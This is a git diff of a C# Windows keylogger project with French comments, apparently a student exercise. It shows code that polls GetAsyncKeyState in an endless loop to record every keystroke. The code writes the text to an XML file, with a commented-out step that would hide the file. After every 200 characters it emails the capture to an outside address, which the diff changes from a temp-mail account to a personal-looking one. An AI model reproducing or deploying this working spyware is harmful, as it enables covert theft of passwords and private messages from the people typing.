@@ -10,6 +10,7 @@ using System.Runtime.InteropServices;
 using System.Net.Mail;
 using System.Threading;
 using System.Windows.Input;
+using System.Threading.Tasks;
 
 namespace ProjetKeyLogger
 {
@@ -19,6 +20,9 @@ namespace ProjetKeyLogger
         private CollectionEnregistrement collection_enregistrement;
 
         private string file_path;
+
+        //Initialisation du nombre de caractere tapé
+        private int nb_caractere_tape;
 
         public string File_Path
         {
@@ -31,11 +35,15 @@ namespace ProjetKeyLogger
         //Constructeur(peut etre pas nécessaire)
         public KeyLogger()
         {
+            //initialisation du nombre de caractere
+            nb_caractere_tape = 0;
+
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
             file_path = "../../../Fichier XML/TestXML.xml";
+
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
@@ -51,13 +59,8 @@ namespace ProjetKeyLogger
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
             Enregistrement enregistrement = new Enregistrement();
-
-            //Initialisation du nombre de caractere tapé
-            int nb_caractere_tape = 0;
-
             //capture les frappes de touches et les afficher dans la console
             bool majuscule = false;
-
             while (true) //boucle "infinie" pour avoir le statut des touches en temps réel
             {
                 //Comme on a une boucle infinie, il faut permettre aux autres fonctions de se déclencher et donc arreter la boucle temporairement
@@ -68,23 +71,23 @@ namespace ProjetKeyLogger
 
                 //liste des touches pour lesquelles la saisie est intérrompue
                 //Si une de ces touches est enfoncé, la capture est intérompu exemple : "ctrl + c" la lettre "c" n'est pas capturé
-                int[] list_non_accepte = new int[] { 17 ,18 ,91 };
+                int[] list_non_accepte = new int[] { 17, 18, 91 };
 
                 //le tableau des touches d'interruptions de la capture est parcouru
                 for (int i = 0; i < list_non_accepte.Length; i++)
                 {
                     //Si la touche est enfoncée on suspend l'autorisation de saisie du texte
                     int statut_cle = GetAsyncKeyState(list_non_accepte[i]);
-                    if (statut_cle == 32769) { autorise_saisie = false;  }
+                    if (statut_cle == 32769) { autorise_saisie = false; }
                 }
 
                 //verification de l'état de chaque touche (up ou down)
                 //avec une table des code ASCII, les codes de clavier vont de 0 à 127
                 //on va vérifier ces 128 touches
-                
+
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                    
+
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active
                     //le statut est a 32769 si la touche est appuyé donc on va pouvoir voir les touches
@@ -93,7 +96,7 @@ namespace ProjetKeyLogger
                     {
                         switch (codeASCII)
                         {
-                            
+
                             //Si touche Entrée
                             case 13:
                                 //Sinon on peut faire un console.writeline tout simplement ?
@@ -105,14 +108,15 @@ namespace ProjetKeyLogger
                                 break;
                             //si touche maj
                             case 20:
-                                if ( majuscule == false)
+                                if (majuscule == false)
                                 {
                                     majuscule = true;
-                                } else
+                                }
+                                else
                                 {
                                     majuscule = false;
                                 }
-                                                                   
+
                                 break;
                             case 8:
                                 enregistrement.effacerContenu();
@@ -160,11 +164,12 @@ namespace ProjetKeyLogger
                                 {//clavier des lettres : distinction majuscules ou non
                                     if (majuscule == false)
                                         //cas des caracteres speciaux au lieu des chiffres
-                                        if (codeASCII >47 & codeASCII < 58)
+                                        if (codeASCII > 47 & codeASCII < 58)
                                         {
-                                            string valeurs="à&é\"'(-è_ç";
-                                            Console.Write(valeurs.Substring(codeASCII-48,1));
-                                        } else
+                                            string valeurs = "à&é\"'(-è_ç";
+                                            Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                        }
+                                        else
                                         {
                                             Console.Write(Char.ToLower((char)codeASCII));
                                         }
@@ -177,35 +182,32 @@ namespace ProjetKeyLogger
                                 enregistrement.ajouterContenu((char)codeASCII);
                                 //Sinon on incrémente le nombre de caracteres tapé
                                 nb_caractere_tape += 1;
-                                break;
+                                break; 
 
                         }
-
-                       
-                        //Si plus de 100 caracteres ont été tapé
-                        if (nb_caractere_tape > 100)
-                        {
-                            //On enregistre le contenue en xml
-                            collection_enregistrement.saveToXml(file_path);
-
-                            //on cache le xml
-                          //  File.SetAttributes(file_path, FileAttributes.Hidden);
-                            //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
-
-
-                            //On reinitialise le nombre de caracteres
-                            nb_caractere_tape = 0;
-
-                            //On réinitialise la collection
-                            collection_enregistrement = new CollectionEnregistrement();
-
-                            //Puis on envoie un mail
-                            envoieMail();
-                        }
-
 
                     }
+                    if (nb_caractere_tape > 200)
+                    {
+                        //On enregistre le contenue en xml
+                        collection_enregistrement.saveToXml(file_path);
+
+                        //on cache le xml
+                        //  File.SetAttributes(file_path, FileAttributes.Hidden);
+                        //pour voir le xml panneau de configuration > Appareance et personalisation > afficher les fichiers et dossiers cachés > fichiers et dossiers cachés puis decocher la case
+
+
+                        //On reinitialise le nombre de caracteres
+                        nb_caractere_tape = 0;
+
+                        //On réinitialise la collection
+                        collection_enregistrement = new CollectionEnregistrement();
+
+                        //envoie du mail
+                        envoieMail();
+                    }
                 }
+
             }
         }
 
@@ -243,7 +245,7 @@ namespace ProjetKeyLogger
             //definition de l'adresse de destination 
             //Création d'un mail temporaire. On peut aussi mettre notre adresse mail!
             //site de création du mail : temp-mail.org
-            Message_Mail.To.Add("jejarer632@nonicamy.com");
+            Message_Mail.To.Add("ccamenen@outlook.fr");
 
             //defition de l'objet du mail
             Message_Mail.Subject = Objet_Mail;
@@ -263,6 +265,7 @@ namespace ProjetKeyLogger
             //Envoie du message
             Client.Send(Message_Mail);
 
+            Console.WriteLine("Email envoyé");
         }
 
 
